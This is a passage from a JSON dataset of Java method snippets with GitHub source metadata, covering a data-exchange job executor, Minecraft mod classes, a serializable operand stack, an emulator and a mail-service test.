              if(!taskFuture.isDone()) {\n                    //Get lock for executing\n                    exec.lock();\n                    LOG.info(\"Open daemon threads for taskId: [{}]\", taskId);\n                    openDaemons(taskProcess, jobId + \"_\" + taskId);\n                    try {\n                        exitCode = taskFuture.get();\n                    } catch (InterruptedException e) {\n                        LOG.error(\"Task [{}] process have been interrupted\", taskId);\n                        throw e;\n                    } finally {\n                        //Release lock for executing\n                        exec.unlock();\n                    }\n                }else{\n                    exitCode = taskFuture.get();\n                }\n                if(exitCode == JobContainer.TASK_CODE_SUCCESS){\n                    status = ExecuteStatus.SUCCESS;\n                }else if (exitCode == JobContainer.TASK_CODE_KILL){\n                    status = ExecuteStatus.KILL;\n                }else{\n                    status = ExecuteStatus.FAILD;\n                }\n            }catch(TaskResAllocException e){\n                try {\n                    LOG.info(\"Allocate task [{}] failed, message: [{}] try to destroy the process...\", taskId, e.getMessage());\n                    taskProcess.destroy();\n                }catch(Exception e0){\n                    //ignore\n                }\n            }\n        } catch (Exception e) {\n            if(status == ExecuteStatus.RUNNING) {\n                ex = e;\n                //this must to be failed\n                status = ExecuteStatus.FAILD;\n                message = e.getMessage();\n            }else{\n                LOG.error(\"Task allocate failed, [{}], message: [{}]\", taskId, e.getMessage());\n            }\n        } finally {\n            clean(taskProcess);\n            if(status != ExecuteStatus.NONE && status != ExecuteStatus.KILL){\n                if(null == ex | !(ex instanceof InterruptedException)) {\n                    try {\n                        //\u4efb\u52a1\u5b8c\u6210\u60c5\u51b5\n                        completeListener.handleComplete(taskProcess, status, message);\n                    } catch (Exception e) {\n                        LOG.error(\"TASK_ERROR, notify server task [{}] complete error.\", String.valueOf(taskId), e);\n                    }\n                    try {\n                        LOG.info(\"Start to close the daemon pool of task [{}]\", taskId);\n                        long record = System.currentTimeMillis();\n                        daemonPoolManager.shutdown();\n                        LOG.info(\"Finish closing the daemon pool of task [{}], spend time in millis: [{}]\",\n                                taskId, System.currentTimeMillis() - record);\n                    }catch(Exception e){\n                        //ignore error\n                        LOG.error(\"Cannot shutdown the task [{}] 's daemons thread completely.\", String.valueOf(taskId), e);\n                    }\n                }\n            }\n            TaskHandleListener listener = handleListenerMap.get(String.valueOf(Hook.TASK_END));\n            if(null != listener){\n                listener.handle(taskProcess, message);\n            }\n        }\n\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/JobExecutor.java", "stars": "23", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["public"]}}, {"id": 33004, "method_name": "addHook", "class_name": "JobExecutor", "params": ["Hook", "TaskHandleListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addHook(Hook hook, TaskHandleListener handleListener){\n        handleListenerMap.put(String.valueOf(hook), handleListener);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/JobExecutor.java", "stars": "23", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["public"]}}, {"id": 33005, "method_name": "getTaskState", "class_name": "JobExecutor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TaskState", "snippet": "    public TaskState getTaskState(){\n        return TaskProcessUtils.getTaskState(taskProcess);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/JobExecutor.java", "stars": "23", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["public"]}}, {"id": 33006, "method_name": "openDaemons", "class_name": "JobExecutor", "params": ["TaskProcess", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void openDaemons(TaskProcess process, String namePrefix){\n       daemonPoolManager.addDaemon(\n               new LoggerDaemon(namePrefix , JobContainer.LOG_STDOUT_NAME,\n                       this.taskProcess, process.getInputStream())\n       );\n       daemonPoolManager.addDaemon(\n               new LoggerDaemon(namePrefix, JobContainer.LOG_STDERR_NAME,\n                       this.taskProcess, process.getErrorStream())\n       );\n       daemonPoolManager.addDaemon(\n               new ClockDaemon(namePrefix + \"-clock\", this.taskProcess, this.exec,\n                       this.timeout, this.handleListenerMap.get(String.valueOf(Hook.TASK_TIMEOUT)))\n       );\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/JobExecutor.java", "stars": "23", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["public"]}}, {"id": 33007, "method_name": "getResourceManager", "class_name": "JobExecutor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ResourceManager", "snippet": "    public ResourceManager getResourceManager() {\n        return resourceManager;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/JobExecutor.java", "stars": "23", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["public"]}}, {"id": 33008, "method_name": "setResourceManager", "class_name": "JobExecutor", "params": ["ResourceManager"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setResourceManager(ResourceManager resourceManager) {\n        this.resourceManager = resourceManager;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/JobExecutor.java", "stars": "23", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["public"]}}, {"id": 33009, "method_name": "allocAndExec", "class_name": "JobExecutor", "params": ["TaskProcess"], "throws": ["TaskResAllocException"], "modifiers": ["private"], "return_type": "Future<Integer>", "snippet": "    private Future<Integer> allocAndExec(TaskProcess taskProcess) throws TaskResAllocException{\n        //Get lock for allocating\n        alloc.lock();\n        boolean exec = false;\n        boolean preAlloc = true;\n        try{\n            Resource resource = this.taskProcess.getResource();\n            //Pre allocate\n            if(null != resourceManager){\n                preAlloc = resourceManager.allocate(resource);\n            }\n            if(preAlloc) {\n                LOG.info(\"Pre-allocate task [{}] resource success, \" +\n                        \"resource:[\"+ Json.toJson(resource, null) + \"]\", TaskProcessUtils.getTaskId(taskProcess));\n                //execute and allocate actually\n                return taskProcess.executeAsync();\n            }else{\n                LOG.info(\"Pre-allocate task:[\" + TaskProcessUtils.getTaskId(taskProcess) + \"]  resource failed,\" +\n                        \" resource:[\" + Json.toJson(resource, null)+ \"]\");\n                throw new TaskResAllocException();\n            }\n        }finally{\n            notAlloc.signalAll();\n            alloc.unlock();\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/JobExecutor.java", "stars": "23", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["public"]}}, {"id": 33010, "method_name": "clean", "class_name": "JobExecutor", "params": ["TaskProcess"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void clean(TaskProcess taskProcess){\n        long taskId = TaskProcessUtils.getTaskId(taskProcess);\n        LOG.info(\"Task [{}] finish, start to release the resource\", taskId);\n        try {\n            if(null != resourceManager){\n                resourceManager.collect(taskProcess.getResource());\n            }\n            taskProcess.clean();\n        }catch(Exception e){\n            LOG.error(\"IO_ERROR: release the resource of  task [{}] failed\", taskId, e);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/JobExecutor.java", "stars": "23", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["public"]}}, {"id": 33011, "method_name": "getJobId", "class_name": "JobExecutor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getJobId() {\n        return jobId;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/JobExecutor.java", "stars": "23", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["public"]}}, {"id": 33012, "method_name": "initElements", "class_name": "SettStairsBlock", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\n\t\telements.blocks.add(() -> new CustomBlock());\n\t\telements.items\n\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/SettStairsBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 33013, "method_name": "getDrops", "class_name": "CustomBlock", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\n\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\n\t\t\tif (!dropsOriginal.isEmpty())\n\t\t\t\treturn dropsOriginal;\n\t\t\treturn Collections.singletonList(new ItemStack(this, 0));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/SettStairsBlock.java", "stars": "2", "class_props": {"extends": "StairsBlock", "implements": null, "modifiers": ["public", "static"]}}, {"id": 33014, "method_name": "onMessage", "class_name": "AbstractPacket", "params": ["REQ", "MessageContext"], "throws": null, "modifiers": ["public"], "return_type": "REQ", "snippet": "    public REQ onMessage(REQ message, MessageContext ctx) {\n        if (ctx.side == Side.CLIENT) {\n            Minecraft.getMinecraft().addScheduledTask(() -> message.onClient(message, FMLClientHandler.instance().getClient().player));\n        } else {\n            FMLCommonHandler.instance().getMinecraftServerInstance().addScheduledTask(() -> message.onServer(message, ctx.getServerHandler().player));\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Network/AbstractPacket.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMessage", "IMessageHandler"], "modifiers": ["public", "abstract"]}}, {"id": 33015, "method_name": "onClient", "class_name": "AbstractPacket", "params": ["REQ", "EntityPlayer"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void onClient(REQ message, EntityPlayer player);\n\n    public abstract void onServer(REQ message, EntityPlayer player);\n}\n\n", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Network/AbstractPacket.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMessage", "IMessageHandler"], "modifiers": ["public", "abstract"]}}, {"id": 33016, "method_name": "onServer", "class_name": "AbstractPacket", "params": ["REQ", "EntityPlayer"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void onServer(REQ message, EntityPlayer player);\n}\n\n", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Network/AbstractPacket.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMessage", "IMessageHandler"], "modifiers": ["public", "abstract"]}}, {"id": 33017, "method_name": "sell_potatoes", "class_name": "Food", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid sell_potatoes() {\n\t\tSystem.out.println(\"Trader has \" + num_potatoes + \" potatoes!\");\n\t\tSystem.out.println(\"They cost a total of $\" + potato_price_per_kg + \" per kg!\");\n\t}", "url": "https://raw.githubusercontent.com/suncloudsmoon/Random-Trading/master/Random%20Trading/src/Food_Trading.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33018, "method_name": "potato_math", "class_name": "Food", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String potato_math() {\n\t\tdouble total_price = potato_price_per_kg * num_potatoes;\n\t\tString total_price_display =  \"The total price is $\" + total_price;\n\t\treturn total_price_display;\n\t}", "url": "https://raw.githubusercontent.com/suncloudsmoon/Random-Trading/master/Random%20Trading/src/Food_Trading.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33019, "method_name": "potato_total_price", "class_name": "Food", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "\tpublic double potato_total_price() {\n\t\tdouble total_price = potato_price_per_kg * num_potatoes;\n\n\t\treturn total_price;\n\t}", "url": "https://raw.githubusercontent.com/suncloudsmoon/Random-Trading/master/Random%20Trading/src/Food_Trading.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33020, "method_name": "onMenuItemClick", "class_name": "GenericMenuClickListener", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onMenuItemClick (android.view.MenuItem p0)\n\t{\n\t\treturn n_onMenuItemClick (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/GenericMenuClickListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 33021, "method_name": "n_onMenuItemClick", "class_name": "GenericMenuClickListener", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onMenuItemClick (android.view.MenuItem p0);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/GenericMenuClickListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 33022, "method_name": "monodroidAddReference", "class_name": "GenericMenuClickListener", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/GenericMenuClickListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 33023, "method_name": "monodroidClearReferences", "class_name": "GenericMenuClickListener", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/GenericMenuClickListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 33024, "method_name": "hasInt", "class_name": "OperandStack", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasInt() {\n        return itop > 0;\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33025, "method_name": "popInt", "class_name": "OperandStack", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int popInt() {\n        if (itop == 0) {\n            throw new EmptyStackException(\"pop int\");\n        }\n\n        return istack[--itop];\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33026, "method_name": "pushInt", "class_name": "OperandStack", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pushInt(int i) {\n        if (itop == istack.length) {\n            int[] hlp = new int[istack.length * 2];\n            System.arraycopy(istack, 0, hlp, 0, istack.length);\n            istack = hlp;\n        }\n        istack[itop++] = i;\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33027, "method_name": "hasFloat", "class_name": "OperandStack", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasFloat() {\n        return ftop > 0;\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33028, "method_name": "popFloat", "class_name": "OperandStack", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float popFloat() {\n        if (ftop == 0) {\n            throw new EmptyStackException(\"pop float\");\n        }\n        return fstack[--ftop];\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33029, "method_name": "pushFloat", "class_name": "OperandStack", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pushFloat(int f) {\n        if (ftop == fstack.length) {\n            float[] hlp = new float[fstack.length * 2];\n            System.arraycopy(fstack, 0, hlp, 0, fstack.length);\n            fstack = hlp;\n        }\n        fstack[ftop++] = f;\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33030, "method_name": "hasDouble", "class_name": "OperandStack", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasDouble() {\n        return dtop > 0;\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33031, "method_name": "popDouble", "class_name": "OperandStack", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "    public double popDouble() {\n        if (dtop == 0) {\n            throw new EmptyStackException(\"pop double\");\n        }\n        return dstack[--dtop];\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33032, "method_name": "pushDouble", "class_name": "OperandStack", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pushDouble(int d) {\n        if (dtop == dstack.length) {\n            double[] hlp = new double[dstack.length * 2];\n            System.arraycopy(dstack, 0, hlp, 0, dstack.length);\n            dstack = hlp;\n        }\n        dstack[dtop++] = d;\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33033, "method_name": "hasLong", "class_name": "OperandStack", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasLong() {\n        return ltop > 0;\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33034, "method_name": "popLong", "class_name": "OperandStack", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long popLong() {\n        if (ltop == 0) {\n            throw new EmptyStackException(\"pop long\");\n        }\n        return lstack[--ltop];\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33035, "method_name": "pushLong", "class_name": "OperandStack", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pushLong(int l) {\n        if (ltop == lstack.length) {\n            long[] hlp = new long[lstack.length * 2];\n            System.arraycopy(lstack, 0, hlp, 0, lstack.length);\n            lstack = hlp;\n        }\n        lstack[ltop++] = l;\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33036, "method_name": "hasObject", "class_name": "OperandStack", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasObject() {\n        return otop > 0;\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33037, "method_name": "popObject", "class_name": "OperandStack", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object popObject() {\n        if (otop == 0) {\n            throw new EmptyStackException(\"pop object\");\n        }\n        Object o = ostack[--otop];\n        ostack[otop] = null;\n        return o;\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33038, "method_name": "pushObject", "class_name": "OperandStack", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pushObject(Object o) {\n        if (otop == ostack.length) {\n            Object[] hlp = new Object[ostack.length * 2];\n            System.arraycopy(ostack, 0, hlp, 0, ostack.length);\n            ostack = hlp;\n        }\n        ostack[otop++] = o;\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33039, "method_name": "hasReference", "class_name": "OperandStack", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasReference() {\n        return rtop > 0;\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33040, "method_name": "popReference", "class_name": "OperandStack", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object popReference() {\n        if (rtop == 0) {\n            throw new EmptyStackException(\"pop reference\");\n        }\n        Object r = rstack[--rtop];\n        rstack[rtop] = null;\n        return r;\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33041, "method_name": "pushReference", "class_name": "OperandStack", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pushReference(Object r) {\n        if (rtop == rstack.length) {\n            Object[] hlp = new Object[rstack.length * 2];\n            System.arraycopy(rstack, 0, hlp, 0, rstack.length);\n            rstack = hlp;\n        }\n        rstack[rtop++] = r;\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33042, "method_name": "isEmpty", "class_name": "OperandStack", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isEmpty() {\n        return itop == 0 && ltop == 0 && dtop == 0 && ftop == 0 && otop == 0 && rtop == 0;\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33043, "method_name": "isSerializable", "class_name": "OperandStack", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isSerializable() {\n        for (int i = 0; i < otop; i++) {\n            final Object o = ostack[i];\n            if (!(o instanceof Serializable)) {\n                return false;\n            }\n        }\n        for (int i = 0; i < rtop; i++) {\n            final Object r = rstack[i];\n            if (!(r instanceof Serializable)) {\n                return false;\n            }\n        }\n        return true;\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33044, "method_name": "toString", "class_name": "OperandStack", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        final StringBuilder sb = new StringBuilder();\n        sb.append(\"i[\").append(itop).append(\"]\\n\");\n        sb.append(\"f[\").append(ftop).append(\"]\\n\");\n        sb.append(\"d[\").append(dtop).append(\"]\\n\");\n        sb.append(\"l[\").append(ltop).append(\"]\\n\");\n        sb.append(\"o[\").append(otop).append(\"]\\n\");\n        for (int i = 0; i < otop; i++) {\n            sb.append(' ').append(i).append(\": \");\n            sb.append(ostack[i].getClass().getName());\n            sb.append(\"@\").append(ostack[i].hashCode()).append('\\n');\n        }\n        sb.append(\"r[\").append(rtop).append(\"]\\n\");\n        for (int i = 0; i < rtop; i++) {\n            sb.append(' ').append(i).append(\": \");\n            sb.append(rstack[i].getClass().getName());\n            sb.append(\"@\").append(rstack[i].hashCode()).append('\\n');\n        }\n\n        return sb.toString();\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33045, "method_name": "writeObject", "class_name": "OperandStack", "params": ["ObjectOutputStream"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void writeObject(ObjectOutputStream s) throws IOException {\n        s.writeInt(itop);\n        for (int i = 0; i < itop; i++) {\n            s.writeInt(istack[i]);\n        }\n\n        s.writeInt(ftop);\n        for (int i = 0; i < ftop; i++) {\n            s.writeDouble(fstack[i]);\n        }\n\n        s.writeInt(dtop);\n        for (int i = 0; i < dtop; i++) {\n            s.writeDouble(dstack[i]);\n        }\n\n        s.writeInt(ltop);\n        for (int i = 0; i < ltop; i++) {\n            s.writeLong(lstack[i]);\n        }\n\n        s.writeInt(otop);\n        for (int i = 0; i < otop; i++) {\n            s.writeObject(ostack[i]);\n        }\n\n        s.writeInt(rtop);\n        for (int i = 0; i < rtop; i++) {\n            s.writeObject(rstack[i]);\n        }\n\n        s.writeObject(runnable);\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33046, "method_name": "readObject", "class_name": "OperandStack", "params": ["ObjectInputStream"], "throws": ["IOException", "ClassNotFoundException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException {\n        itop = s.readInt();\n        istack = new int[itop];\n        for (int i = 0; i < itop; i++) {\n            istack[i] = s.readInt();\n        }\n\n        ftop = s.readInt();\n        fstack = new float[ftop];\n        for (int i = 0; i < ftop; i++) {\n            fstack[i] = s.readFloat();\n        }\n\n        dtop = s.readInt();\n        dstack = new double[dtop];\n        for (int i = 0; i < dtop; i++) {\n            dstack[i] = s.readDouble();\n        }\n\n        ltop = s.readInt();\n        lstack = new long[ltop];\n        for (int i = 0; i < ltop; i++) {\n            lstack[i] = s.readLong();\n        }\n\n        otop = s.readInt();\n        ostack = new Object[otop];\n        for (int i = 0; i < otop; i++) {\n            ostack[i] = s.readObject();\n        }\n\n        rtop = s.readInt();\n        rstack = new Object[rtop];\n        for (int i = 0; i < rtop; i++) {\n            rstack[i] = s.readObject();\n        }\n\n        runnable = (Runnable) s.readObject();\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/OperandStack.java", "stars": "3", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33047, "method_name": "dispatch", "class_name": "ResetEvent", "params": ["Computer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void dispatch(Computer computer) {\n        computer.getCPU().reset();\n        for (Device d : computer.getDevices()) {\n            d.reset();\n        }\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/ResetEvent.java", "stars": "4", "class_props": {"extends": "EmulatorEvent", "implements": null, "modifiers": ["public"]}}, {"id": 33048, "method_name": "setup", "class_name": "MailServiceIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setup() {\n        MockitoAnnotations.initMocks(this);\n        doNothing().when(javaMailSender).send(any(MimeMessage.class));\n        mailService = new MailService(jHipsterProperties, javaMailSender, messageSource, templateEngine);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MailServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33049, "method_name": "testSendEmail", "class_name": "MailServiceIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testSendEmail() throws Exception {\n        mailService.sendEmail(\"john.doe@example.com\", \"testSubject\", \"testContent\", false, false);\n        verify(javaMailSender).send(messageCaptor.capture());\n        MimeMessage message = messageCaptor.getValue();\n        assertThat(message.getSubject()).isEqualTo(\"testSubject\");\n        